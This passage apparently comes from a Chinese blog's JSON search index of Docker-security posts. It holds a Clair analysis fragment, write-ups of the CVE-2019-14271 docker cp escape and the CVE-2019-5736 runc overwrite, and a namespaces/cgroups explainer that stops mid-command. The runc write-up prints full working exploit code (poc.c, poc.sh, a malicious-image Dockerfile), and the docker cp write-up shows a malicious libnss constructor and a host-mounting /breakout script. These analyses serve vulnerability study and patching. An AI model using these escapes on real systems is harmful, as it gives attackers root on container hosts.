path string, headers map[string]string, parent *database.Layer)(namespace *database.Namespace, featureVersions []database.FeatureVersion, errerror) {\n  ......\n\n//解析namespace\n   namespace, err = detectNamespace(name,files, parent)\n   if err != nil {\n      return\n   }\n\n   //解析特征版本\n\n  featureVersions, err = detectFeatureVersions(name, files, namespace,parent)\n   if err != nil {\n      return\n   }\n  ......\n\nreturn\n}\n```\n\n\n\n**参考：**\n\nhttps://blog.csdn.net/weixin_39800144/article/details/79019503\n\nhttps://cloud.tencent.com/developer/article/1039768\n\nhttps://zhuanlan.zhihu.com/p/43372662\n\nhttps://zhuanlan.zhihu.com/p/41958018\n\nhttps://www.freebuf.com/column/157784.html\n\nhttps://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/ ","tags":["docker镜像","clair"],"categories":["docker安全"]},{"title":"Docker cp漏洞分析","url":"/2019/11/05/Docker-cp漏洞分析/","content":"\n# 前言\n\n 本文转自[安全客](https://www.anquanke.com/post/id/193218)\n\n[CVE-2019-14271](https://nvd.nist.gov/vuln/detail/CVE-2019-14271)是Docker `cp`命令实现中存在的一个安全问题，攻击者可以利用该漏洞实现完整的容器逃逸。这是从2月份`runC`[漏洞](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)公布以来第一个容器逃逸类漏洞。 \n\n# Docker cp\n\n我们可以使用`copy`命令，将文件拷贝至/拷贝出容器，也可以在容器间相互拷贝。命令语法非常简单，与标准的Unix `cp`命令类似。为了从容器中拷贝出`/var/logs`，我们可以使用该语法：`docker cp container_name:/var/logs /some/host/path`。 \n\n如下图所示，为了将文件从容器中拷出，Docker使用了一个辅助进程：`docker-tar`。 \n\n![img](/images/b4/1.png)\n\n `docker-tar`的原理是[chroot](https://man.linuxde.net/chroot)（ **chroot命令**用来在指定的根目录下运行指令 ）到容器中（如下图所示），归档其中请求的文件及目录，然后将生成的`tar`文件传回Docker守护进程，该进程负责将文件提取到宿主机上的目标目录中。 \n\n![img](/images/b4/2.png)\n\n执行`chroot`操作最主要的目的是避免符号链接（symlink）攻击，当宿主机进程尝试访问容器中的文件时就可能发生这种攻击。如果其中某个文件为符号链接，那么就可能被解析到宿主机的根目录，这样攻击者控制的容器就有可能通过容器的`cp`命令在宿主机上读取并写入文件。在过去一年中，[Docker](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15664)及[Podman](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10152)中已经有多个CVE与符号链接有关。通过`chroot`到容器根目录，`docker-tar`就可以确保所有的符号链接已被正确解析。 \n\n不幸的是，`chroot`到容器中存在一个副作用，当从容器中拷贝文件时，会造成更严重的后果。 \n\n## CVE-2019-14271\n\nDocker采用Golang编写，更具体一些，存在漏洞的Docker版本采用Go v1.11编译。在这个版本中，包含嵌入式C代码（`cgo`）的某些package会在运行时动态加载共享库。这些package包括`net`及`os/user`，`docker-tar`都用到了这两个package，会在运行时动态加载一些`libnss_*.so`库。正常情况下，程序库会从宿主机的文件系统中加载，然而由于`docker-tar`会`chroot`到容器中，因此会从容器的文件系统中加载这些库。这意味着`docker-tar`会加载并执行受容器控制的代码。\n\n这里要澄清一点：除了`chroot`到容器文件系统中之外，`docker-tar`并没有被容器化。`docker-tar`运行在宿主机命名空间中，具备所有root功能，并且没有受`cgroups`以及`seccomp`限制。因此，攻击者可以将代码注入到`docker-tar`，就可以通过恶意容器获得宿主机的完整root访问权限。\n\n当Docker用户从如下几种容器中拷贝文件时，就存在被攻击的风险：\n\n- 运行恶意镜像的容器，其中带有恶意的`libnss_*.so`库；\n- 攻击者在被入侵的容器中替换`libnss_*.so`库。\n\n在这两种情况下，攻击者都可以获得宿主机上的root代码执行权限。\n\n有趣的是，研究人员实际上是从某个[GitHub issue](https://github.com/moby/moby/issues/39449)中发现了该漏洞，当时用户尝试从某个`debian:buster-slim`容器中拷贝文件，但`docker cp`命令总是无法成功执行。当时的问题在于该镜像并没有包含`libnss`库，因此当用户运行`docker cp`命令，`docker-tar`进程尝试从容器系统中加载这些库时，就会出现错误。\n\n## 漏洞利用\n\n为了利用CVE-2019-14271，我们需要构建一个恶意的`libnss`库，这里我选择的是`libnss_files.so`。我下载了该库的源代码，在源文件中添加了一个函数：`run_at_link()`。我还使用[constructor](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html)属性来定义该函数。`constructor`属性（GCC特定语法）表示`run_at_link`函数会在目标库被进程加载时作为初始化函数来执行，这意味着当`docker-tar`进程动态加载我们的恶意库时，`run_at_link`就会被执行。`run_at_link`代码如下所示，这里我做了适当精简：\n\n```c\n#include ...\n\n#define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\"\n#define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\"\n\nbool is_priviliged();\n\n__attribute__ ((constructor)) void run_at_link(void)\n{\n     char * argv_break[2];\n     if (!is_priviliged())\n           return;\n\n     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);\n     fprintf(log_fp, \"switched back to the original libnss_file.so\");\n\n     if (!fork())\n     {\n\n           // Child runs breakout\n           argv_break[0] = strdup(\"/breakout\");\n           argv_break[1] = NULL;\n           execve(\"/breakout\", argv_break, NULL);\n}\n     else\n           wait(NULL); // Wait for child\n\n     return;\n}\nbool is_priviliged()\n{\n     FILE * proc_file = fopen(\"/proc/self/exe\", \"r\");\n     if (proc_file != NULL)\n     {\n           fclose(proc_file);\n           return false; // can open so /proc exists, not privileged\n     }\n     return true; // we're running in the context of docker-tar\n}\n```\n\n`run_at_link`首先会验证代码运行在`docker-tar`上下文中，这是因为其他正常的容器进程也可能加载该库。代码通过检查`/proc`目录完成该操作。如果`run_at_link`运行在`docker-tar`上下文中，那么该目录将为空，这是因为挂载到`/proc`的`procfs`只存在于容器的`mount`命名空间中。\n\n接下来，`run_at_link`会将恶意库替换为原始的`libnss`库。这样能确保利用代码运行的后续进程不会意外加载恶意库，避免再次执行`run_at_link`。\n\n随后，为了简化利用过程，`run_at_link`会尝试运行容器中的`/breakout`可执行文件。这样后续利用代码就可以在bash中完成，不需要依赖于C。后续利用逻辑不受限于`run_at_link`，这也意味着当利用代码有改动时，我们不需要每次都重新编译恶意库，只需要修改`breakout`程序即可。\n\n如[下图](https://asciinema.org/a/HfdKQKFn7Cn67e5QLWm9gzFfT)所示，当Docker用户运行恶意镜像（其中包含我们的恶意`libnss_files.so`库），尝试从容器中拷贝某些日志文件时，镜像中的`/breakout`程序就会执行。这里的`/breakout`是一个简单的bash脚本，会将宿主文件系统加载到容器的`/host_fs`，并将信息写入宿主机上的`/evil`。\n\n![img](/images/b4/3.png)\n\n`/breakout`脚本源码如下所示。为了获取宿主机根文件系统的引用，脚本将`procfs`挂载到`/proc`。由于`docker-tar`运行在宿主机的`PID`命名空间中，被挂载的`procfs`将会包含宿主机进程中的数据。该脚本随后会挂载宿主机`PID 1`的根目录。\n\n```bash\n#!/bin/bash\n\numount /host_fs && rm -rf /host_fs\nmkdir /host_fs\n\nmount -t proc none /proc     # mount the host's procfs over /proc\ncd /proc/1/root              # chdir to host's root\nmount --bind . /host_fs      # mount host root at /host_fs\necho \"Hello from within the container!\" > /host_fs/evil\n```\n\n# 补丁\n\n漏洞[补丁](https://github.com/moby/moby/pull/39612)修复了`docker-tar`的`init`函数，避免存在问题的Go package调用任意函数。补丁强制`docker-tar`在`chroot`到容器前，先从宿主机系统中加载`libnss`库。\n\n![img](/images/b4/4.png)\n\n# 总结\n\n如果某个漏洞能够在宿主机上执行代码，那该漏洞将非常危险。用户应确保当前运行[19.03.1](https://docs.docker.com/engine/release-notes/#19031)版或更高版本的Docker，这些版本中已经修复了该问题。为了限制这类漏洞的攻击面，我建议大家永远不要运行不可信的镜像。\n\n此外，如果不是特殊情况，我建议大家以非`root`用户运行容器，这样能进一步提高容器安全性，避免攻击者利用容器引擎或者内核中存在的各种问题。对于CVE-2019-14271漏洞，如果容器以非`root`用户运行，那么当前环境仍然安全。即便攻击者成功入侵容器，也无法覆盖容器的`libnss`库，因为这些库归`root`所有，因此攻击者无法利用该漏洞。Ariel Zelivansky还发表过一篇[文章](https://unit42.paloaltonetworks.com/non-root-containers-kubernetes-cve-2019-11245-care/)，其中介绍了以非`root`用户运行容器的各种优点，供大家参考。","tags":["docker cp","CVE-2019-14271"],"categories":["docker安全"]},{"title":"Docker runc漏洞分析","url":"/2019/09/25/Docker-runc漏洞分析/","content":"\n# 漏洞简介\n\nRunC 是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。我们可以认为它就是个命令行小工具，可以不用通过 docker 引擎，直接运行容器。事实上，runC 是标准化的产物，它根据 OCI 标准来创建和运行容器。而 OCI(Open Container Initiative)组织，旨在围绕容器格式和运行时制定一个开放的工业化标准。\n\n换一句话说，其实 Docker 在管理容器的时候，其实底层就是跑的RunC。\n\n```bash\nroot@VM-118-78-ubuntu:~# docker info | grep \"runc\"Runtimes: runcDefault Runtime: runcrunc version: N/A (expected: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe)WARNING: No swap limit support\n```\n\n该漏洞允许恶意容器（以最少的用户交互）覆盖主机runc二进制文件，从而在主机上以root级别执行代码。用户交互的级别能够允许上下文中的任何一个容器以root身份运行任何命令：\n\n1. 使用攻击者控制的映像创建新的容器；\n\n2. 将（docker exec）附加到攻击者之前具有写入权限的已有容器中。\n\n这两种情况看起来可能不同，但都需要runC来启动容器中的新进程，并以类似的方式实现。在这两种情况下，runC的任务是**在容器中运行用户定义的二进制文件**。 在Docker中，这个二进制文件是启动新容器时映像的入口点，或者是附加到现有容器时的docker exec参数。  \n\n运行这个用户二进制文件时，它必须已经被限制在容器内，否则可能会威胁主机安全。为了实现这一点，runC创建了一个名为“runC init”的子进程，它将所有需要的限制放在其自身（例如：输入、设置命名空间），并有效地将其自身放置在容器中。然后，现在在容器中的runC init进程调用`execve`系统调用，使用用户请求的二进制文件覆盖自身。 \n\n# 漏洞影响\n\nUbuntu：runc 1.0.0~rc4+dfsg1-6ubuntu0.18.10.1之前版本\n\nDebian：runc 0.1.1+dfsg1-2 之前版本\nRedHat Enterprise Linux： docker 1.13.1-91.git07f3374.el7之前版本\nAmazon Linux：docker 18.06.1ce-7.25.amzn1.x86_64之前版本\n\nCoreOS：2051.0.0之前版本\nKops Debian 所有版本（正在修复）\nDocker：18.09.2之前版本\n\n# 利用条件\n\n使用攻击者控制的镜像创建新容器\n攻击者具有某容器的写入权限，通过docker exec或其他方式进入容器中\n\n# 漏洞原理\n\n要了解漏洞，我们首先需要了解一些procfs的基础知识。Proc文件系统是 [Linux](http://www.codercto.com/category/linux.html) 中的一个虚拟文件系统，主要提供有关进程的信息，通常安装在/proc上。它在某种意义上来说是虚拟的，因为它在磁盘上实际不存在。相反，内核会在内存中创建它。它还可以被认为是一个内存为文件系统公开的系统数据接口。每个进程在procfs中都有自己的目录，位于/proc/[pid]： \n\n![img](/images/b3/1.png)\n\n 下图标书runC用于创建新容器以及将进程附加到现有容器的方法 \n\n![img](/images/b3/2.png)\n\n研究人员发现，攻击者可以通过要求runC运行/proc/self/exe来欺骗runC执行其自身，这是一个指向主机上runC二进制文件的符号链接。 \n\n![img](/images/b3/3.png)\n\nDocker 提供 `exec` 命令方便用户在宿主机与容器进行交互。如通过 `docker run exec -it < CONTAINER ID> /bin/bash` ，可以进入容器在容器中执行命令，此命令实际上执行了容器中的 `/bin/bash` 文件。我们可以在容器内覆盖目标文件为 `#!/proc/self/exe` ，如下图所示： \n\n![img](/images/b3/4.png)\n\n **\\#!语法被称为Shebang，**在脚本中用于指定解释器。当Linux加载器遇到Shebang时，**将会运行解释器**，而不是可执行文件。 \n\n又知Docker的很多操作都是通过runc去运行的，因此可以通过 `docker exec` 命令执行到被覆盖的目标文件，欺骗runc执行它自己。因此在容器外运行 `docker run exec -it < CONTAINER ID> /bin/bash` 会欺骗runc运行 `/proc/self/exe` （runc）如下图： \n\n![img](/images/b3/5.png)\n\n此时 `/bin/bash` 已经被替换，并且成功欺骗runc执行runc。但runc进程不会一直驻留，因此编写一个Shell代码测试。 \n\n```shell\nwhile true; do\n  for f in $(ps -ef | awk '{print $2}'); do\n    cmdline=$(cat /proc/${f}/cmdline)\n     if [[ ${cmdline} == *runc* ]]; then\n           echo   ！！！！！！！！found runc in proc ！！！！！！！！！！！！！\n      fi\n  done\ndone\n```\n\n在运行以上代码时通过 `docker exec` 执行容器中的 `/bin/bash` ,看到如下输出即说明欺骗成功：\n\n![img](/images/b3/6.png)\n\n**此时由于runc在使用中，无法直接覆盖runc，因此需要使用C语言编写PoC。**通过 `O_PATH` 标志,忽略权限打开runc所在 `/proc/${pid}/exe` 的二进制文件，获取其文件标识符 `fd` 。然后在从文件标识符中（ `/proc/self/fd/${fd}` ）以 `O_WRONLY` （只写）标志重新打开文件，然后在一个循环中重复尝试将Payload写入文件标识符中，写入成功后在runc退出的时候会覆盖宿主机上的runc文件。再次使用runc（执行 `docker exec` 等）即可执行恶意代码。 \n\n利用效果如下，在容器中执行Shell覆盖 `/bin/bash` 文件并监控进程： \n\n![img](/images/b3/7.png)\n\n在容器外执行容器内的 `/bin/bash` 后，容器内发现runc进程马上执行恶意代码写入Payload： \n\n![img](/images/b3/8.png)\n\n查看效果：\n\n![img](/images/b3/9.png)\n\n**POC构造：**\n\n- 拥有 `docker exec` 权限,可构造PoC如下：\n\n**payload.c**\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n\nint main (int argc, char **argv) {\n  execl(\"/usr/bin/touch\", \"touch\", \"/hacked_by_Tunan\", NULL);\n  return 0;\n}\n```\n\n**poc.c**\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n\n#define PAYLOAD_MAX_SIZE 1048576\n#define O_PATH 010000000\n#define SELF_FD_FMT \"/proc/self/fd/%d\"\n\nint main(int argc, char **argv) {\n    int fd, ret;\n    char *payload, dest[512];\n\n    if (argc < 2) {\n        printf(\"usage: %s FILE\\n\", argv[0]);\n        return 1;\n    }\n\n    payload = malloc(PAYLOAD_MAX_SIZE);\n    if (payload == NULL) {\n        puts(\"Could not allocate memory for payload.\");\n        return 2;\n    }\n\n    FILE *f = fopen(\"./payload\", \"r\");\n    if (f == NULL) {\n        puts(\"Could not read payload file.\\n\");\n        return 3;\n    }\n    int payload_sz = fread(payload, 1, PAYLOAD_MAX_SIZE, f);\n\n    for (;;) {\n        fd = open(argv[1], O_PATH); // O_PATH打开文件不需要对文件有权限\n        if (fd >= 0) {\n            printf(\"Successfuly opened %s at fd %d\\n\", argv[1], fd);\n            snprintf(dest, 500, SELF_FD_FMT, fd);// 格式化字符串，将文件标识符写入dest中\n            puts(dest);// 写入缓冲区\n            int i;\n            for (i = 0; i < 9999999; i++) {\n                fd = open(dest, O_WRONLY | O_TRUNC); // 以只写的形式再次打开缓冲区中的内容，拿到fd（文件标识符）\n                if (fd >= 0) {\n                    printf(\"Successfully openned runc binary as WRONLY\\n\");\n                    ret = write(fd, payload, payload_sz); // 写入文件标识符\n                    if (ret > 0) printf(\"Payload deployed\\n\");\n                    break;\n                }\n            }\n            break;\n        }\n    }\n    return 0;\n}\n```\n\npoc.sh\n\n```shell\n#!/bin/bash\n\nfunction poc() {\n    echo '#!/proc/self/exe' > /bin/bash\n    chmod +x /bin/bash\n\n    while true; do\n        for pid in $(ps -ef | awk '{print $2}'); do\n            cmdline=$(cat /proc/${pid}/cmdline)\n            if [[ ${cmdline} == *runc* ]]; then\n                echo ！！！！！！！！runc was found ！！！！！！！！！！！！！\n                echo pid:${pid}\n                echo starting exploit\n                ./poc /proc/${pid}/exe\n                echo finish! run docker exec -it <CONTAINER ID> /bin/bash to see the effect\n            fi\n        done\n    done\n}\n\nexec 2>/dev/null\npoc\n```\n\n- 如果没有 `docker exec` 权限，可构造恶意image，增加Dockerfile：\n\n```dockerfile\nFROM ubuntu\nRUN apt-get update\nRUN apt-get install -y build-essential\nADD . /poc\nWORKDIR /poc\nRUN make\nCMD [\"./poc.sh\"]\n```\n\n# 漏洞修复\n\n[merge branch ‘cve-2019-5736’](https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d)\n\n![img](/images/b3/10.png)\n\n补丁中增加了克隆二进制文件的相关处理，并且在 `nsexec()` 函数中增加了判断是否是克隆文件的逻辑，如果不是克隆文件则抛出错误并退出。 \n\nensure_cloned_binary 函数：\n\n```c\nint ensure_cloned_binary(void)\n{\n\tint execfd;\n\tchar **argv = NULL, **envp = NULL;\n\n\t/* Check that we're not self-cloned, and if we are then bail. */\n\tint cloned = is_self_cloned();\n\tif (cloned > 0 || cloned == -ENOTRECOVERABLE)\n\t\treturn cloned;\n\n\tif (fetchve(&argv, &envp) < 0)\n\t\treturn -EINVAL;\n\n\texecfd = clone_binary();\n\tif (execfd < 0)\n\t\treturn -EIO;\n\n\tfexecve(execfd, argv, envp);\n\treturn -ENOEXEC;\n}\n```\n\n首先判断 exe 是否被clone\n\n```c\nstatic int is_self_cloned(void)\n{\n\tint fd, ret, is_cloned = 0;\n\n\tfd = open(\"/proc/self/exe\", O_RDONLY|O_CLOEXEC);\n\tif (fd < 0)\n\t\treturn -ENOTRECOVERABLE;\n\n#ifdef HAVE_MEMFD_CREATE\n\tret = fcntl(fd, F_GET_SEALS);\n\tis_cloned = (ret == RUNC_MEMFD_SEALS);\n#else\n\tstruct stat statbuf = {0};\n\tret = fstat(fd, &statbuf);\n\tif (ret >= 0)\n\t\tis_cloned = (statbuf.st_nlink == 0);\n#endif\n\tclose(fd);\n\treturn is_cloned;\n}\n```\n\n如果否，则执行 clone_binary 函数\n\n```c\nstatic int clone_binary(void)\n{\n\tint binfd, memfd;\n\tssize_t sent = 0;\n\n#ifdef HAVE_MEMFD_CREATE\n\tmemfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);\n#else\n\tmemfd = open(\"/tmp\", O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0711);\n#endif\n\tif (memfd < 0)\n\t\treturn -ENOTRECOVERABLE;\n\n\tbinfd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n\tif (binfd < 0)\n\t\tgoto error;\n\n\tsent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);\n\tclose(binfd);\n\tif (sent < 0)\n\t\tgoto error;\n\n#ifdef HAVE_MEMFD_CREATE\n\tint err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);\n\tif (err < 0)\n\t\tgoto error;\n#else\n\t/* Need to re-open \"memfd\" as read-only to avoid execve(2) giving -EXTBUSY. */\n\tint newfd;\n\tchar *fdpath = NULL;\n\n\tif (asprintf(&fdpath, \"/proc/self/fd/%d\", memfd) < 0)\n\t\tgoto error;\n\tnewfd = open(fdpath, O_RDONLY | O_CLOEXEC);\n\tfree(fdpath);\n\tif (newfd < 0)\n\t\tgoto error;\n\n\tclose(memfd);\n\tmemfd = newfd;\n#endif\n\treturn memfd;\n\nerror:\n\tclose(memfd);\n\treturn -EIO;\n}\n```\n\nreturn 一个新的 fd\n\n\n\n**参考：**\n\nhttps://www.codercto.com/a/62757.html\n\nhttps://www.codercto.com/a/59353.html","tags":["runc","docker exec","linux文件系统"],"categories":["docker安全"]},{"title":"Docker安全机制","url":"/2019/08/16/Docker安全机制/","content":"\n# Namespace\n\n## Namespace简介\n\nLinux Namespace 是 Linux 内核提供的一个功能，可以实现系统资源的隔离。目前共有六种namespace：\n\n| 类型              | 系统调用参数  | 内核版本 |\n| :---------------- | :------------ | :------- |\n| Mount Namespace   | CLONE_NEWNS   | 2.4.19   |\n| UTS Namespace     | CLONE_NEWUTS  | 2.6.19   |\n| IPC Namespace     | CLONE_NEWIPC  | 2.6.19   |\n| PID Namespace     | CLONE_NEWPID  | 2.6.24   |\n| Network Namespace | CLONE_NEWNET  | 2.6.29   |\n| User Namespace    | CLONE_NEWUSER | 3.8      |\n\n**可以通过三个系统调用的方式：**\n\n- clone， 创建新的进程和新的namespace，新创建的进程 attach 到新创建的 namespace\n- unshare，不创建新的进程，创建新的 namespace 并把当前进程 attach 上\n- setns， attach 进程到已有的 namespace 上\n\nshell 也提供了一个和系统调用同名的 unshare 命令可以非常简单的创建 namespace。\n\n```bash\nsudo unshare --fork --pid --mount-proc bash\n```\n\n## 六种类型说明\n\n1. UTS(UNIX Timesharing System) Namespace 可以用来隔离 nodename 和 domainname 两个系统标识。在 UTS Namespace 中，每个 Namespace 可以有自己的 hostname。 \n\n2.  IPC(Interprocess Communication) Namespace 用来隔离 System V IPC 和 POSIX message queues。每一个 IPC Namespace 都有自己的 System V IPC 和 POSIX message queue。 \n3.  PID(Process ID) Namespace 可以用来隔离进程 ID。**同一个进程在不同的 PID Namespace 中可以拥有不同的 PID**。在 Docker Container 中，使用 `ps -ef` 可以看到启动容器的进程 PID 为 1，但是在宿主机上，该进程却又有不同的 PID。 \n4.  Mount Namespace 用来隔离各个进程看到的挂载点视图。在不同的 Namespace 中，看到的挂载点文件系统层次是不一样的。在 Mount Namespace 中调用 `mount` 和 `unmount` 仅仅会影响当前 Namespace 内的文件系统，而对全局文件系统是没有影响的。 \n5.  User Namespace 主要是隔离用户的用户组 ID。也就是说，一个进程的 User ID 和 Group ID 在 User Namespace 内外可以是不同的。比较常用的是，在宿主机上以一个非 root 用户运行创建一个 User Namespace，然后在 User Namespace 中被映射为了 root 用户。**这意味着这个进程在 User Namespace 中有 root 权限，但是在宿主机上却没有 root 权限。 **\n6.  Network Namespace 用来隔离网络设置、IP 地址和端口号等网络栈的 Namespace。Network Namespace 可以让每个容器拥有自己独立的网络设备，而且容器内的应用可以绑定到自己的端口，每个 Namespace 的端口都不会有冲突。在宿主机搭建网桥后，就能很方便地实现容器之间的通信。 \n\n# Cgroups\n\n## 简介\n\nLinux Namespace 帮助进程隔离出自己的单独空间，而 Cgroups 则可以限制每个空间的大小。 Linux cgroups 的全称是 Linux Control Groups，它是 Linux 内核的特性，主要作用是**限制、记录和隔离进程组（process groups）使用的物理资源（cpu、memory、IO 等）**。 \n\n**Cgroups 从设计之初使命就很明确，为进程提供资源控制，它主要的功能包括：**\n\n- **资源限制**：限制进程使用的资源上限，比如最大内存、文件系统缓存使用限制\n- **优先级控制**：不同的组可以有不同的优先级，比如 CPU 使用和磁盘 IO 吞吐\n- **审计**：计算 group 的资源使用情况，可以用来计费\n- **控制**：挂起一组进程，或者重启一组进程\n\n## cgroups 核心概念\n\n前面说过，cgroups 是用来对进程进行资源管理的，因此 cgroup 需要考虑如何抽象这两种概念：进程和资源，同时如何组织自己的结构。cgroups 中有几个非常重要的概念：\n\n- **task**：任务，对应于系统中运行的一个实体，一般是指进程\n- **subsystem**：子系统，具体的资源控制器（resource class 或者 resource controller），控制某个特定的资源使用。比如 CPU 子系统可以控制 CPU 时间，memory 子系统可以控制内存使用量\n- **cgroup**：控制组，一组任务和子系统的关联关系，表示对这些任务进行怎样的资源管理策略\n- **hierarchy**：层级树，一系列 cgroup 组成的树形结构。每个节点都是一个 cgroup，cgroup 可以有多个子节点，子节点默认会继承父节点的属性。系统中可以有多个 hierarchy\n\n虽然 cgroups 支持 hierarchy，允许不同的子资源挂到不同的目录，但是多个树之间有各种限制，增加了理解和维护的复杂性。在实际使用中，所有的子资源都会统一放到某个路径下（比如 ubuntu16.04 的 `/sys/fs/cgroup/`），因此本文并不详细介绍多个树的情况，感兴趣的可以参考 [RedHat 的这篇文档。](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/sec-Relationships_Between_Subsystems_Hierarchies_Control_Groups_and_Tasks.html)\n\n### 子资源系统（Resource Classes or SubSystem）\n\n目前有下面这些资源子系统：\n\n- Block IO（`blkio`)：限制块设备（磁盘、SSD、USB 等）的 IO 速率\n- CPU Set(`cpuset`)：限制任务能运行在哪些 CPU 核上\n- CPU Accounting(`cpuacct`)：生成 cgroup 中任务使用 CPU 的报告\n- CPU (`CPU`)：限制调度器分配的 CPU 时间\n- Devices (`devices`)：允许或者拒绝 cgroup 中任务对设备的访问\n- Freezer (`freezer`)：挂起或者重启 cgroup 中的任务\n- Memory (`memory`)：限制 cgroup 中任务使用内存的量，并生成任务当前内存的使用情况报告\n- Network Classifier(`net_cls`)：为 cgroup 中的报文设置上特定的 classid 标志，这样 tc 等工具就能根据标记对网络进行配置\n- Network Priority (`net_prio`)：对每个网络接口设置报文的优先级\n- `perf_event`：识别任务的 cgroup 成员，可以用来做性能分析\n\n### Hierarchy\n\nLinux 进程之间组成一棵树的结构，每个进程（除了 `init` 根进程之外）都有一个父进程，子进程创建之后会继承父进程的一些属性（比如环境变量，打开的文件描述符等）。\n\n和进程模型类似，只不过 cgroups 是一个森林结构。\n\n## 使用 cgroups\n\ncgroup 内核功能比较有趣的地方是它没有提供任何的系统调用接口，而是对 linux vfs 的一个实现，因此可以用类似文件系统的方式进行操作。\n\n使用 cgroups 的方式有几种：\n\n- 使用 cgroups 提供的虚拟文件系统，直接通过创建、读写和删除目录、文件来控制 cgroups\n- 使用命令行工具，比如 libcgroup 包提供的 cgcreate、cgexec、cgclassify 命令\n- 使用 `rules engine daemon` 提供的配置文件\n- 当然，systemd、lxc、docker 这些封装了 cgroups 的软件也能让你通过它们定义的接口控制 cgroups 的内容\n\n#### 查看 cgroups 挂载信息\n\n在 ubuntu 16.04 的机器上，cgroups 已经挂载到文件系统上了，可以通过 `mount` 命令查看：\n\n```bash\nroot@PEK1000251892:~# mount -t cgroup\ncgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)\ncgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)\ncgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)\ncgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb,release_agent=/run/cgmanager/agents/cgm-release-agent.hugetlb)\ncgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset,clone_children)\ncgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)\ncgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event,release_agent=/run/cgmanager/agents/cgm-release-agent.perf_event)\ncgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids,release_agent=/run/cgmanager/agents/cgm-release-agent.pids)\ncgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)\ncgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)\ncgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)\n```\n\n如果没有的话，也可以通过以下命令来把想要的 subsystem mount 到系统中：\n\n```bash\nroot@PEK1000251892:~# mount mount -t cgroup -o cpu,cpuset,memory cpu_and_mem /cgroup/cpu_and_mem\n```\n\n上述命令表示把 cpu、cpuset、memory 三个子资源 mount 到 `/cgroup/cpu_and_mem` 目录下。\n\n每个 cgroup 目录下面都会有描述该 cgroup 的文件，除了每个 cgroup 独特的资源控制文件，还有一些通用的文件：\n\n- `tasks`：当前 cgroup 包含的任务（task）pid 列表，把某个进程的 pid 添加到这个文件中就等于把进程移到该 cgroup\n- `cgroup.procs`：当前 cgroup 中包含的 thread group 列表，使用逻辑和 `tasks` 相同\n- `notify_on_release`：0 或者 1，是否在 cgroup 销毁的时候执行 notify。如果为 1，那么当这个 cgroup 最后一个任务离开时（退出或者迁移到其他 cgroup），并且最后一个子 cgroup 被删除时，系统会执行 `release_agent` 中指定的命令\n- `release_agent`：需要执行的命令\n\n#### 创建 cgroup\n\n创建 cgroup，可以直接用 `mkdir` 在对应的子资源中创建一个目录：\n\n```bash\nroot@PEK1000251892:~# mkdir /sys/fs/cgroup/cpu/mycgroup\nroot@PEK1000251892:~# ls /sys/fs/cgroup/cpu/mycgroup\ncgroup.clone_children  cpuacct.stat   cpuacct.usage_percpu  cpu.cfs_quota_us  cpu.stat           tasks\ncgroup.procs           cpuacct.usage  cpu.cfs_period_us     cpu.shares        notify_on_release\n```\n\n上面命令在 cpu 子资源中创建了 `mycgroup`，创建 cgroup 之后，目录中会自动创建需要的文件。\n\n#### 删除 cgroup\n\n删除子资源，就是删除对应的目录：\n\n```bash\nroot@PEK1000251892:~# rmdir /sys/fs/cgroup/cpu/mycgroup/\n```\n\n删除之后，如果 tasks 文件中有进程，它们会自动迁移到父 cgroup 中。\n\n#### 设置 cgroup 参数\n\n设置 group 的参数就是直接往特定的文件中写入特定格式的内容，比如要限制 cgroup 能够使用的 CPU 核数：\n\n```bash\nroot@PEK1000251892:~# echo 0-1 > /sys/fs/cgroup/cpuset/mycgroup/cpuset.cpus\n```\n\n#### 把进程加入到 cgroup\n\n要把某个已经运行的进程加入到 cgroup，可以直接往需要的 cgroup tasks 文件中写入进程的 PID：\n\n```bash\nroot@PEK1000251892:~# echo 2358 > /sys/fs/cgroup/memory/mycgroup/tasks\n```\n\n#### 在 cgroup 中运行进程\n\n如果想直接把进程运行在某个 cgroup，但是运行前还不知道进程的 Pid 应该怎么办呢？\n\n我们可以利用 cgroup 的继承方式来实现，**因为子进程会继承父进程的 cgroup**，因此我们可以把当前 shell 加入到要想的 cgroup：\n\n```bash\nroot@PEK1000251892:~# echo $$ > 